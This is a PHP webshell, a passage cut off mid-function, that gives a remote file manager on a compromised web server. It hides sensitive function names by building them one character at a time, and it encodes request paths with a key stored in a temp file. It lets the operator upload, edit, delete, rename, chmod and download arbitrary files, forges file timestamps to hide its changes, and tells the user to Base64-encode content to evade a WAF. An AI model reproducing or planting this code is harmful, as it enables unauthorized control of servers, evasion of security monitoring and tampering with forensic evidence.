<?php
header("content-Type: text/html; charset=utf-8");
session_start();
error_reporting(0);
global $Method;
global $OsType;
global $ScriptLocation;
global $Deskey;
global $str_1;
global $str_4;
global $str_5;
global $str_6;
global $str_8;
global $str_9;
global $file;

setcookie("msg", "");
$tols = new t();
$file = new f();

$str_1 = $tols->SStr('W') . $tols->SStr('i') . $tols->SStr('n') . $tols->SStr('d') . $tols->SStr('o') . $tols->SStr('w') . $tols->SStr('s');

$str_2 = $tols->SStr('L') . $tols->SStr('i') . $tols->SStr('n') . $tols->SStr('u') . $tols->SStr('x');

$str_3 = $tols->SStr('W') . $tols->SStr('I') . $tols->SStr('N');

$str_4 = $tols->SStr('C') . $tols->SStr(':') . $tols->SStr('/') . $str_1 . $tols->SStr('/') . $tols->SStr('T') . $tols->SStr('e') . $tols->SStr('m') . $tols->SStr('p') . $tols->SStr('/') . $tols->SStr('k') . $tols->SStr('e') . $tols->SStr('y') . $tols->SStr('s') . $tols->SStr('.') . $tols->SStr('c');

$str_5 = $tols->SStr('/') . $tols->SStr('t') . $tols->SStr('m') . $tols->SStr('p') . $tols->SStr('/') . $tols->SStr('k') . $tols->SStr('e') . $tols->SStr('y') . $tols->SStr('s') . $tols->SStr('.') . $tols->SStr('c');

$str_7 = $tols->SStr('f') . $tols->SStr('i') . $tols->SStr('l') . $tols->SStr('e') . $tols->SStr('_') . $tols->SStr('p') . $tols->SStr('u') . $tols->SStr('t') . $tols->SStr('_') . $tols->SStr('c') . $tols->SStr('o') . $tols->SStr('n') . $tols->SStr('t') . $tols->SStr('e') . $tols->SStr('n') . $tols->SStr('t') . $tols->SStr('s');

$str_8 = $tols->SStr('r') . $tols->SStr('e') . $tols->SStr('n') . $tols->SStr('a') . $tols->SStr('m') . $tols->SStr('e');

$str_9 = $tols->SStr('f') . $tols->SStr('w') . $tols->SStr('r') . $tols->SStr('i') . $tols->SStr('t') . $tols->SStr('e');

$str_10 = $tols->SStr('o') . $tols->SStr('p') . $tols->SStr('e') . $tols->SStr('n') . $tols->SStr('d') . $tols->SStr('i') . $tols->SStr('r');

$fgc = $tols->SStr('f').$tols->SStr('i').$tols->SStr('l').$tols->SStr('e').$tols->SStr('_').$tols->SStr('g').$tols->SStr('e').$tols->SStr('t').$tols->SStr('_').$tols->SStr('c').$tols->SStr('o').$tols->SStr('n').$tols->SStr('t').$tols->SStr('e').$tols->SStr('n').$tols->SStr('t').$tols->SStr('s');

$str_6 = !($tols->FunisDisable($fgc)) ? ($tols->SStr('g') . $tols->SStr('e') . $tols->SStr('t') . $tols->SStr('T') . $tols->SStr('e') . $tols->SStr('x') . $tols->SStr('t')) : $fgc;

$Method = $_SERVER['REQUEST_METHOD'];

$OsType = strtoupper(substr(PHP_OS, 0, 3)) === $str_3 ? $str_1 : $str_2;

$keys_Path = ($OsType == $str_1) ? $str_4 : $str_5;

$ScriptLocation = $_SERVER["PHP_SELF"];

$tols->initMM();

$Deskey = $str_6($keys_Path);

class t
{
    function initMM()
    {
        global $str_1;
        global $str_4;
        global $str_5;
        global $str_7;
        global $OsType;
        $keys_Path = '';
        if ($OsType == $str_1) {
            $keys_Path = $str_4;
        } else {
            $keys_Path = $str_5;
        }
        if (!file_exists($keys_Path)) {
            $Deskey = $this->getRandomString(12);
            $str_7($keys_Path, $Deskey);
        }
        return $Deskey;
    }
    function location()
    {
        return header('Location:' . $_SERVER['HTTP_REFERER']);
    }
    function alert_location($msg, $url)
    {
        return '<script>alert("' . $msg . '");window.location.href="' . $url . '"</script>';
        die;
    }
    function IsBase64($str)
    {
        return $str == base64_encode(base64_decode($str)) ? true : false;
    }
    function FunisDisable($str)
    {
        $disabled = explode(',', ini_get('disable_functions'));
        return !in_array($str, $disabled);
    }
    function SStr($str)
    {
        $AllStr = array(
            'a' => 'a',
            'b' => 'b',
            'c' => 'c',
            'd' => 'd',
            'e' => 'e',
            'f' => 'f',
            'g' => 'g',
            'h' => 'h',
            'i' => 'i',
            'j' => 'j',
            'k' => 'k',
            'l' => 'l',
            'm' => 'm',
            'n' => 'n',
            'o' => 'o',
            'p' => 'p',
            'q' => 'q',
            'r' => 'r',
            's' => 's',
            't' => 't',
            'u' => 'u',
            'v' => 'v',
            'w' => 'w',
            'x' => 'x',
            'y' => 'y',
            'z' => 'z',
            '0' => '0',
            '1' => '1',
            '2' => '2',
            '3' => '3',
            '4' => '4',
            '5' => '5',
            '6' => '6',
            '7' => '7',
            '8' => '8',
            '9' => '9',
            'A' => 'A',
            'B' => 'B',
            'C' => 'C',
            'D' => 'D',
            'E' => 'E',
            'F' => 'F',
            'G' => 'G',
            'H' => 'H',
            'I' => 'I',
            'J' => 'J',
            'K' => 'K',
            'L' => 'L',
            'M' => 'M',
            'N' => 'N',
            'O' => 'O',
            'P' => 'P',
            'Q' => 'Q',
            'R' => 'R',
            'S' => 'S',
            'T' => 'T',
            'U' => 'U',
            'V' => 'V',
            'W' => 'W',
            'X' => 'X',
            'Y' => 'Y',
            'Z' => 'Z',
            '/' => '/',
            '_' => '_',
            ':' => ':',
            '.' => '.'
        );
        return $AllStr[$str];
    }
    function getRandomString($len, $chars = null)
    {
        if (is_null($chars)) {
            $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        }
        mt_srand(10000000 * (float)microtime());
        $str1 = '';
        $num = 0;
        for ($i = 0, $str = '', $lc = strlen($chars) - 1; $i < $len; $i++) {
            if ($i == 6) {
                $num++;
                if ($num == 6) {
                    $str .= $str1;
                    break;
                } else {
                    $str .= $str1 . ' ';
                    $i = 0;
                    $str1 = '';
                }
            }
            $str1 .= $chars[mt_rand(0, $lc)];
        }
        return $str;
    }
    function CreateStr($str)
    {
        $Ok = '';
        foreach (str_split($str) as $k => $v) {
            $Ok .= '$tols->SStr(' . '\'' . $str[$k] . '\'' . ').';
        }
        return $Ok;
    }
    function EnCoding($str)
    {
        global $Deskey;
        $Split_Key_Data = explode(' ', $Deskey);
        $New_Str = '';
        $str = base64_encode($str);

        for ($i = 0; $i < strlen($str); $i++) {
            $New_Str .= $str[$i] . $Split_Key_Data[array_rand($Split_Key_Data)];
        }
        return $New_Str;
    }
    function DeCoding($str)
    {
        global $Deskey;

        $string = str_replace(" ", "+", $str);

        $Split_Key_Data = explode(' ', $Deskey);

        foreach ($Split_Key_Data as $v) {
            $string = str_replace($v, '', $string);
        }

        if ($this->IsBase64($string)) {
            return base64_decode($string);
        } else {
            return $string;
        }
    }
    function CheckCharset($str)
    {
        $code = array(
            'GBK',
            'EUC-CN',
            'BIG5',
            'EUC-TW',
            'CP950',
            'BIG5-HKSCS',
            'UTF-8',
            'GB2312',
            'CP936',
            'BIG5-HKSCS:2001',
            'BIG5-HKSCS:1999',
            'ISO-2022-CN',
            'ISO-2022-CN-EXT',
            'SJIS',
            'JIS',
            'EUC-JP',
            'SHIFT_JIS',
            'eucJP-win',
            'SJIS-win',
            'ISO-2022-JP',
            'CP932',
            'ISO-2022-JP',
            'ISO-2022-JP-2',
            'ISO-2022-JP-1',
            'EUC-KR',
            'CP949',
            'ISO-2022-KR',
            'JOHAB',
        );

        foreach ($code as $charset) {
            if ($str == @iconv('UTF-8', "$charset//IGNORE//TRANSLIT", @iconv($charset, 'UTF-8//IGNORE//TRANSLIT', $str))) {
                return $charset;
                break;
            }
        }

        return 'UTF-8';
    }
    function EditTime($path)
    {
        global $str_10;

        $dir = $_SERVER['DOCUMENT_ROOT'] . '/';

        $filetime[] = '';

        if (is_dir($dir)) {
            if ($dh = $str_10($dir)) {
                while (($file = readdir($dh)) !== false) {
                    $filetime[] = date("Y-m-d H:i:s", @filemtime($file));
                }
                closedir($dh);
            }
        }

        $time_count = count($filetime);


        $nowtime = $filetime[mt_rand(1, $time_count)];


        $crate_time = $filetime[mt_rand(1, $time_count)];


        $request_time = $filetime[mt_rand(1, $time_count)];


        $edit_time = $filetime[mt_rand(1, $time_count)];

        touch($path, mktime($crate_time));
    }
    function Replace_Str($string)
    {
        return str_replace('//', '/', str_replace('\\', '/', $string));
    }
    function unescapeGB2312($str)
    {
        $str = rawurldecode($str);
        preg_match_all("/%u.{4}|&#x.{4};|&#d+;|.+/U", $str, $r);
        $ar = $r[0];
        foreach ($ar as $k => $v) {
            if (substr($v, 0, 2) == "%u")
                $ar[$k] = iconv("UCS-2", "GBK", pack("H4", substr($v, -4)));
            elseif (substr($v, 0, 3) == "&#x")
                $ar[$k] = iconv("UCS-2", "GBK", pack("H4", substr($v, 3, -1)));
            elseif (substr($v, 0, 2) == "&#") {
                $ar[$k] = iconv("UCS-2", "GBK", pack("n", substr($v, 2, -1)));
            }
        }
        return join("", $ar);
    }
    function unescapeUTF8($str)
    {
        $ret = '';
        $len = strlen($str);
        for ($i = 0; $i < $len; $i++) {
            if ($str[$i] == '%' && $str[$i + 1] == 'u') {
                $val = hexdec(substr($str, $i + 2, 4));
                if ($val < 0x7f) $ret .= chr($val);
                else if ($val < 0x800) $ret .= chr(0xc0 | ($val >> 6)) . chr(0x80 | ($val & 0x3f));
                else $ret .= chr(0xe0 | ($val >> 12)) . chr(0x80 | (($val >> 6) & 0x3f)) . chr(0x80 | ($val & 0x3f));
                $i += 5;
            } else if ($str[$i] == '%') {
                $ret .= urldecode(substr($str, $i, 3));
                $i += 2;
            } else $ret .= $str[$i];
        }
        return $ret;
    }
    function ToUTF8($str)
    {
        if (function_exists('mb_convert_encoding')) {
            return mb_convert_encoding($str, $this->CheckCharset($str), "UTF-8");
        } else {
            return $str;
        }
    }
    function CrateTempName()
    {
        return md5(md5(time()));
    }
    function getText($path)
    {
        $a = fopen($path, "r");
        $contents = "";
        do {
            $data = fread($a, 8192);
            if (strlen($data) == 0) {
                break;
            }
            $contents .= $data;
        } while (true);
        fclose($a);
        return $contents;
    }
    function writeText($path,$text){
        $a = fopen($path, "w+");
        fwrite($a,$text);
        fclose($a);
    }
    function dIRList(){

    }
}

class f
{
    function File_Size($size)
    {
        if ($size > 1073741824) $size = round($size / 1073741824 * 100) / 100 . ' G';
        elseif ($size > 1048576) $size = round($size / 1048576 * 100) / 100 . ' M';
        elseif ($size > 1024) $size = round($size / 1024 * 100) / 100 . ' K';
        else $size = $size . ' B';
        return $size;
    }
    function File_Read($filename)
    {
        $handle = fopen($filename, "rb");
        $filecode = @fread($handle, filesize($filename));
        fclose($handle);
        return $filecode;
    }
    function File_Edit($filepath, $filename, $type)
    {
        global $tols;
        global $Method;
        global $str_9;

        switch ($Method) {
            case 'GET':

                $filepath = $tols->DeCoding($filepath);

                $filename = $tols->DeCoding($filename);

                $THIS_DIR = $tols->EnCoding($filepath);

                $THIS_FILE = urldecode($tols->Replace_Str($filepath . '/' . $filename));

                if (file_exists($THIS_FILE)) {
                    $FILE_TIME = date('Y-m-d H:i:s', filemtime($THIS_FILE));
                    $FILE_CODE = htmlspecialchars($this->File_Read($THIS_FILE));
                } else {
                    $FILE_TIME = date('Y-m-d H:i:s', time());
                    $FILE_CODE = '';
                    $Butto_HTML = '
                <center>
                    <input type="button" value="EnCode" onclick="EnText();" style="width:80px;">
                    <input type="button" value="DeCode" onclick="DeText();" style="width:80px;">
                </center>
                <br>
                <br>
                ';
                }
                if (file_exists($THIS_FILE)) {
                    $type = 'e';
                } else {
                    $type = 'n';
                }
                break;
            case 'POST':
                $FilePath = $tols->DeCoding($_POST['pfn']);
                $FileCode = $_POST['pfc'];
                $handle = @fopen($FilePath, 'wb');
                break;
        }

        $FileCharSet = $tols->CheckCharset($FILE_CODE);

        $Html =  '
            <script language="javascript">

            function CheckDate(){
                var re = document.getElementById(' . "'" . 'mtime' . "'" . ').value;
                var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
                var r = re.match(reg);
                if(r==null){alert("The date format is incorrect! format:yyyy-mm-dd hh:mm:ss");return false;}
            }

            function EnText(){
                var text = document.getElementById("text").value;
                text = btoa(text);
                document.getElementById("text").value = text;
            }

            function DeText(){
                var text = document.getElementById("text").value;
                text = atob(text);
                document.getElementById("text").value = text;
            }

            </script>

            <br>
            <span> 
            <div class="actall">Clear text path:<input type="text" name="pfn" value="' . $THIS_FILE . '" style="width:750px;" disabled="disabled"></div>
            </span>
            <form method="POST" action="?s=e&p=' . $THIS_DIR . '&t=' . $type . '">
                <span> 
                    <div class="actall">Encryption path:<input type="text" name="pfn" value="' . $tols->EnCoding($THIS_FILE) . '" style="width:750px;"></div>
                </span>
                <br>
                <span>
                    <div class="actall">Document content:<textarea name="pfc" id="text" style="width:750px;height:380px;">' . $FILE_CODE . '</textarea> </div>
                </span>
                <br>
                ' . $Butto_HTML . '
                <span> 
                    <div class="actall">Script code:<input type="text" name="charset" value="' . $FileCharSet . '" style="width:750px;"></div>
                </span>
                <br>
                    <div class="actall">Modified:<input type="text" name="mtime" id="mtime" value="' . $FILE_TIME . '" style="width:150px;"></div>
                <br>
                <center>
                    <div class="actall"><input type="submit" value="Save File" onclick="CheckDate();" style="width:80px;">
                    <input type="button" value="return" onclick="window.location=' . "'" . '?s=a&p=' . $THIS_DIR . "'" . ';" style="width:80px;"></div>
                </center>
        </form>';


        switch ($type) {
            case 'e':
                switch ($Method) {
                    case 'GET':
                        echo $Html;
                        break;
                    case 'POST':

                        chmod($FilePath, 0777);

                        $str_9($handle, $FileCode);


                        @touch($_POST['mtime'], $FILE_TIME);

                        @fclose($handle);

                        echo $tols->alert_location("Saving succeeded!", $_SERVER['HTTP_REFERER']);
                        break;
                    default:

                        break;
                }
                break;
            case 'n':
                switch ($Method) {
                    case 'GET':
                        echo $Html;
                        break;
                    case 'POST':
                        if (!($tols->IsBase64($FileCode))) {
                            echo $tols->alert_location("To ensure that the content is not detected by WAF, please transcode it to Base64 and save it!", $_SERVER['HTTP_REFERER']);
                            die;
                        }

                        if (!$str_9($handle, base64_decode($FileCode))) {
                            @chmod($filename, 0666);
                            $str_9($handle, $FileCode);
                        }
                        @fclose($handle);

                        $tols->EditTime($FilePath);
                        echo $tols->alert_location("Saving succeeded!", $_SERVER['HTTP_REFERER']);
                        break;
                    default:

                        break;
                }
                break;
            default:

                break;
        }
    }

    function File_Up($filea, $fileb)
    {
        global $tols;
        $a_m = $tols->SStr('m') . $tols->SStr('o') . $tols->SStr('v') . $tols->SStr('e') . '_' . $tols->SStr('u') . $tols->SStr('p') . $tols->SStr('l') . $tols->SStr('o') . $tols->SStr('a') . $tols->SStr('d') . $tols->SStr('e') . $tols->SStr('d') . '_' . $tols->SStr('f') . $tols->SStr('i') . $tols->SStr('l') . $tols->SStr('e');
        $a_m = $a_m($filea, $fileb) ? true : false;
        if ($a_m) {
            $tols->EditTime($fileb);
            return $a_m;
        }
        $a_c = $tols->SStr('c') . $tols->SStr('o') . $tols->SStr('p') . $tols->SStr('y');
        $a_c = $a_c($filea, $fileb) ? true : false;
        if ($a_c) {
            $tols->EditTime($fileb);
            return $a_c;
        }
    }

    function File_Deltree($deldir)
    {
        global $tols;
        global $str_10;
        if (($mydir = @$str_10($deldir)) == NULL) return false;
        while (false !== ($file = @readdir($mydir))) {
            $name = $tols->Replace_Str($deldir . '/' . $file);
            if ((is_dir($name)) && ($file != '.') && ($file != '..')) {
                @chmod($name, 0777);
                $this->File_Deltree($name);
            }
            if (is_file($name)) {
                @chmod($name, 0777);
                @unlink($name);
            }
        }
        @closedir($mydir);
        @chmod($deldir, 0777);
        return @rmdir($deldir) ? true : false;
    }
    function File_Act($array, $actall, $inver)
    {
        global $tols;

        if (($count = count($array)) == 0) return 'Please select a file';

        $i = 0;

        while ($i < $count) {


            $array[$i] = $tols->DeCoding($array[$i]);

            switch ($actall) {

                case "a":
                    $inver = urldecode($inver);
                    if (!is_dir($inver)) return 'Path error';
                    $filename = array_pop(explode('/', $array[$i]));
                    @copy($array[$i], $tols->Replace_Str($inver . '/' . $filename));
                    $msg = 'Copy to' . $inver . 'catalogue';
                    break;

                case "b":
                    if (!@unlink($array[$i])) {
                        $filename = array_pop(explode('/', $array[$i]));
                        @chmod($filename, 0666);
                        @unlink($array[$i]);
                    }
                    $msg = 'delete';
                    break;

                case "c":
                    $newmode = base_convert($inver, 8, 10);
                    @chmod($array[$i], $newmode);
                    $msg = 'Property is modified as' . $inver;
                    break;
                case "d":
                    @touch($array[$i], strtotime($inver));
                    $msg = 'Modified on' . $inver;
                    break;
            }

            $i++;
        }

        return 'Selected Files  ' . $msg . '  Over';
    }
    function File_a($p)
    {
        global $tols;
        global $str_8;
        global $str_10;

        if ($_SERVER["SERVER_PORT"] == "443") {
            $GETURL = !empty($_SERVER['SERVER_NAME']) ? $GETURL = 'https://' . $_SERVER['SERVER_NAME'] . '/'  : $GETURL = '';
        } else {
            $GETURL = !empty($_SERVER['SERVER_NAME']) ? $GETURL = 'http://' . $_SERVER['SERVER_NAME'] . ':' . $_SERVER["SERVER_PORT"] . '/'  : $GETURL = '';
        }

        if (!@$str_10($p)) {
            setcookie("msg", "  " . $p . "/  " . "Directory not accessible!");
            $tols->location();
        }

        $MSG_BOX = (!empty($_COOKIE['msg'])) ? $_COOKIE['msg'] : 'No new notification message';

        $UP_DIR = $tols->EnCoding($tols->Replace_Str($p . '/..'));

        $REAL_DIR = $tols->Replace_Str(@realpath($p));

        $FILE_DIR = $tols->Replace_Str(dirname(__FILE__));

        $ROOT_DIR =  $this->File_Mode();

        $THIS_DIR = $tols->EnCoding($tols->Replace_Str($REAL_DIR));

        $No_En_THIS_DIR = $tols->Replace_Str($REAL_DIR) . '/';

        $NUM_D = 0;

        $NUM_F = 0;


        if (!empty($_FILES['files'])) {
            $Upload_Msg_Box = '';

            if (count($_FILES['files']) >= 1) {

                $i = 0;

                foreach ($_FILES['files']['error'] as $k => $error) {

                    if ($error == UPLOAD_ERR_OK) {

                        $TmpPath = $_FILES['files']['tmp_name'][$k];

                        $FileName = $tols->IsBase64($_FILES['files']['name'][$k]) ? base64_decode($_FILES['files']['name'][$k]) : $_FILES['files']['name'][$k];

                        $MSG[$i] = $this->File_Up($TmpPath, $tols->Replace_Str($No_En_THIS_DIR . '/' . $FileName)) ? $FileName . ' Upload succeeded' : $FileName . 'Upload failed';

                        $Upload_Msg_Box .= $MSG[$i] . '<br>';
                    }
                    $i++;
                }
            } else {
                $Upload_Msg_Box = 'Please select a file';
            }
        }

        if (!empty($_POST['actall'])) {
            $MSG_BOX = $this->File_Act($_POST['files'], $_POST['actall'], $_POST['inver']);
        }

        if (isset($_GET['md'])) {
            $modfile = $tols->Replace_Str($REAL_DIR . '/' . $_GET['mk']);
            $MSG_BOX = @chmod($modfile, base_convert($_GET['md'], 8, 10)) ? 'modify ' . $modfile . ' property is ' . $_GET['md'] . ' success' : 'modify ' . $modfile . ' property is ' . $_GET['md'] . ' fail';
        }

        if (!empty($_GET['mn'])) {
            $Old_Name = urldecode($tols->DeCoding($_GET['mn']));
            $MSG_BOX = $str_8($tols->Replace_Str($REAL_DIR . '/' . $Old_Name), $tols->Replace_Str($REAL_DIR . '/' . $_GET['rn'])) ? 'Rname ' . $Old_Name . ' by ' . $_GET['rn'] . ' success' : 'Rname ' . $Old_Name . ' by ' . $_GET['rn'] . ' fail';
        }

        if (isset($_GET['dn'])) {
            $CreateFile = urldecode($tols->unescapeUTF8($_GET['dn']));
            $MSG_BOX = @mkdir($tols->Replace_Str($No_En_THIS_DIR . '/' . $CreateFile, 0777)) ? 'Create directory ' . $CreateFile . ' success' : 'Create directory ' . $CreateFile . ' Fail';
        }

        if (isset($_GET['dd'])) {
            $DelPath = urldecode($tols->DeCoding($_GET['dd']));
            $MSG_BOX = $this->File_Deltree($DelPath) ? 'Delete directory ' . $DelPath . ' success' : 'Delete directory ' . $DelPath . ' fail';
        }

        Root_CSS();

        echo '
            <script type="text/javascript">
                
                function Inputok(msg,gourl) {
                    smsg = "Current file:[" + msg + "]";
                    re = prompt(smsg,unescape(msg));
                    if(re)
                    {
                        var url = gourl + escape(re) + "&t=n";
                        window.location = url;
                    }
                }

                function Delok(msg,gourl)
                {
                    smsg = "Are you sure you want to delete[" + unescape(msg) + "]Is it?";

                    if(confirm(smsg))
                    {
                        if(gourl == "b")
                        {
                            document.getElementById(' . "'" . 'actall' . "'" . ').value = escape(gourl);
                            document.getElementById(' . "'" . 'fileall' . "'" . ').submit();
                        } else {
                            window.location = gourl
                        };
                    }
                }

                function CheckDate(msg,gourl)
                {
                    smsg = "Current file time:[" + msg + "]";
                    re = prompt(smsg,msg);
                    if(re)
                    {
                        var url = gourl + re;
                        var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
                        var r = re.match(reg);
                        if(r==null){alert("Incorrect date format!format:yyyy-mm-dd hh:mm:ss");return false;}
                        else{document.getElementById(' . "'" . 'actall' . "'" . ').value = gourl; document.getElementById(' . "'" . 'inver' . "'" . ').value = re; document.getElementById(' . "'" . 'fileall' . "'" . ').submit();}
                    }
                }
                function CheckAll(form)
                {
                    for(var i=0;i<form.elements.length;i++)
                    {
                        var e = form.elements[i];
                        if (e.name != "chkall")
                        e.checked = form.chkall.checked;
                    }
                }
                function SubmitUrl(msg,txt,actid)
                {
                    re = prompt(msg,unescape(txt));
                    if(re)
                    {
                        document.getElementById(' . "'" . 'actall' . "'" . ').value = actid;
                        document.getElementById(' . "'" . 'inver' . "'" . ').value = escape(re);
                        document.getElementById(' . "'" . 'fileall' . "'" . ').submit();
                    }
                }
            </script>

            <div id="msgbox" class="msgbox" style="padding-top: 10px;">' . $MSG_BOX . '</div>
            <div class="actall" style="text-align:center;padding:3px;">
                <form method="get">
                        <input type="hidden" id="s" name="s" value="a"> <input type="text" name="p" value="' . $REAL_DIR . '" style="width:550px;height:22px;"> <select onchange="location.href=' . "'" . '?s=a&p=' . "'" . '+options[selectedIndex].value">
                            <option>
                                ---Quick Directory---
                            </option>
                            <option value="' . $ROOT_DIR . '">
                                Site Root
                            </option>
                            <option value="' . $FILE_DIR . '">
                                Script directory
                            </option>
                        </select> <input type="submit" value="Go" style="width:50px;">
                </form>
                <div style="margin-top:3px;"></div>
                    <form method="POST" action="?s=a&p=' . $THIS_DIR . '" enctype="multipart/form-data" style="height: 30px;padding-top: 10px;">
                        <input type="button" value="NewFile" onclick="Inputok(' . "'" . 'New.php' . "'" . ',' . "'" . '?s=e&p=' . $THIS_DIR . '&n=' . "'" . '' . ');">
                        <input type="button" value="NewDirectory" onclick="Inputok(' . "'" . 'New' . "'" . ',' . "'" . '?s=a&p=' . $THIS_DIR . '&dn=' . "'" . ');">
                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                        <input type="file" multiple="true" name="files[]" style="width:200px;height:30px;">
                        <input type="submit" value="upload" style="width:50px;">
                    </form>
                    ' . $Upload_Msg_Box . '
                </div>

                <form method="POST" name="fileall" id="fileall" action="?s=a&p=' . $THIS_DIR . '">
                <table border="0" style="width: 902px;">
                <tr>
                    <td class="toptd" style="width:400px;"> <a href="?s=a&p=' . $UP_DIR . '"><b>Parent directory</b></a></td>
                    <td class="toptd" style="width:150px;"> oper </td>
                    <td class="toptd" style="width:48px;">  attr </td>
                    <td class="toptd" style="width:173px;"> time </td>
                    <td class="toptd" style="width:75px;">  size </td>
                </tr>' . "\n";

        #
        if (($h_d = @$str_10($p)) == NULL) return false;

        while (($Filename = @readdir($h_d)) !== FALSE) {

            if ($Filename == '.' or $Filename == '..') continue;

            $Filepath = $tols->Replace_Str($REAL_DIR . '/' . $Filename);

            if (is_dir($Filepath)) {

                $Fileperm = substr(base_convert(fileperms($Filepath), 10, 8), -4);

                $Filetime = date('Y-m-d H:i:s', filemtime($Filepath));

                $Filepath = $tols->EnCoding($Filepath);

                $viewer = getenv("HTTP_USER_AGENT");

                if (preg_match("/Windows/i", "$viewer")) {
                    if (function_exists('mb_detect_encoding') || function_exists('mb_convert_encoding')) {
                        $encode = mb_detect_encoding($Filename, array("ASCII", 'UTF-8', "GB2312", "GBK", 'BIG5'));
                        $Filename = mb_convert_encoding($Filename, 'UTF-8', $encode);
                    }
                }


                echo "\r\n" . ' <tr><td> 
                    <a href="?s=a&p=' . $Filepath . '"><font face="wingdings" size="3">0</font><b> ' . $Filename . ' </b></a>
                    </td> ';

                $Filename = urlencode($Filename);

                echo ' <td> <a href="#" onclick="Delok(\'' . $Filename . '\',\'?s=a&p=' . $THIS_DIR . '&dd=' . $tols->EnCoding($Filename) . '\');return false;"> delete </a> ';
                echo ' <a href="#" onclick="Inputok(\'' . $Filename . '\',\'?s=a&p=' . $THIS_DIR . '&mn=' . $tols->EnCoding($Filename) . '&rn=\');return false;"> Rname </a> 
			            <a href="?s=z&p=' . $Filepath . '&t=en" onclick="alert(' . "'" . "Directory Tozipion starts, please do not click the page again!" . "'" . ')"> Tozip </a></td> ';
                echo ' <td> <a href="#" onclick="Inputok(\'' . $Fileperm . '\',\'?s=a&p=' . $THIS_DIR . '&mk=' . $Filename . '&md=\');return false;"> ' . $Fileperm . ' </a> </td> ';
                echo ' <td>' . $Filetime . '</td> ';
                echo ' <td> </td> </tr>' . "\r\n";
                $NUM_D++;
            }
        }

        rewinddir($h_d);

        while (false !== ($Filename = @readdir($h_d))) {

            if ($Filename == '.' or $Filename == '..') continue;

            $Filepath = $tols->Replace_Str($REAL_DIR . '/' . $Filename);



            if (!is_dir($Filepath)) {

                $Fileurls = str_replace($tols->Replace_Str($ROOT_DIR . '/'), $GETURL, $Filepath);
                $Fileperm = substr(base_convert(@fileperms($Filepath), 10, 8), -4);
                $Filetime = @date('Y-m-d H:i:s', @filemtime($Filepath));
                $Filesize = $this->File_Size(@filesize($Filepath));

                if ($Filepath == $tols->Replace_Str(__FILE__)) {
                    $fname = '<font color="#8B0000"><b>' . $Filename . '</b></font>';
                } else {
                    $fname = $Filename;
                }


                $gethz = pathinfo($Filepath);


                $Filepath = $tols->EnCoding($Filepath);

                echo "\r\n" . ' <tr><td> <input type="checkbox" name="files[]" value="' . $Filepath . '"><a target="_blank" href="' . $Fileurls . '">' . $tols->ToUTF8($fname) . '</a> </td>';

                echo ' <td> <a href="?s=e&p=' . $THIS_DIR . '&n=' . $tols->EnCoding($Filename) . '&t=e"> edit </a> ';


                if ($gethz["extension"] == 'zip') {
                    $zip_content = '<a href="?s=z&p=' . $Filepath . '&t=de"> deTozipion </a> ';
                } else {
                    $zip_content = '<a href="?s=z&p=' . $Filepath . '&t=en"> Tozip </a> ';;
                }


                echo '<a href="#" onclick="Inputok(\'' . $Filename . '\',\'?s=a&p=' . $THIS_DIR . '&mn=' . $tols->EnCoding($Filename) . '&rn=\'); return false;"> Rname </a> 
			<a href="?s=d&p=' . $Filepath . '"> down </a> 
			' . $zip_content . '
			</td>';

                echo ' <td>' . $Fileperm . '</td> ';
                echo ' <td>' . $Filetime . '</td> ';
                echo ' <td> ' . $Filesize . '</td>';
                echo ' </tr> ' . "\r\n";
                $NUM_F++;
            }
        }

        closedir($h_d);

        if (!$Filetime){
            $Filetime = '2009-01-01 00:00:00';
        }
        echo '
        </table>
        <div class="actall"> <input type="hidden" id="actall" name="actall" value="undefined"> 
        <input type="hidden" id="inver" name="inver" value="undefined"> 
        <input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);"> 
        <input type="button" value="copy" onclick="SubmitUrl(' . "'" . 'Copy the selected file to the path: ' . "'" . ',' . "'" . $No_En_THIS_DIR . "'" . ',' . "'" . 'a' . "'" . ');return false;">
        <input type="button" value="attr" onclick="SubmitUrl(' . "'" . 'Modify the selected file attribute value to:' . "'" . ',' . "'" . '0666' . "'" . ',' . "'" . 'c' . "'" . ');return false;"> 
        <input type="button" value="time" onclick="CheckDate(' . "'" . $Filetime . "'" . ',' . "'" . 'd' . "'" . ');return false;"> 
        <input type="button" value="delete" onclick="Delok(' . "'" . 'Selected Files' . "'" . ',' . "'" . "b" . "'" . ');return false;"> 
        catalogue(' . $NUM_D . ') / file(' . $NUM_F . ')</div> 
        </form>';
        return true;
    }

    function File_Mode()
    {
        global $tols;
        $RealPath = realpath('./');
        $SelfPath = $_SERVER['PHP_SELF'];
        $SelfPath = substr($SelfPath, 0, strrpos($SelfPath, '/'));
        return $tols->Replace_Str(substr($RealPath, 0, strlen($RealPath) - strlen($SelfPath)));
    }

    function File_Down($path)
    {
        global $tols;
        if (!file_exists($path)) {
            $tols->alert_location("The downed file does not exist!", $_SERVER['HTTP_REFERER']);
        };
        $filedown = basename($path);
        $array = explode('.', $filedown);
        $arrayend = array_pop($array);
        header('Content-type: application/x-' . $arrayend);
        header('Content-Disposition: attachment; filename=' . $filedown);
        header('Content-Length: ' . filesize($path));
        @readfile($path);
        exit;
    }

    function add_File_To_Zip($path, $zip)
    {
        global $tols;
        global $str_10;
        $handler = $str_10($tols->ToUTF8($path));

        $FileList = readdir($handler);
        if ($FileList === false) {
            setcookie("msg", 'Compression failed, the directory is unreadable');
            die;
        }

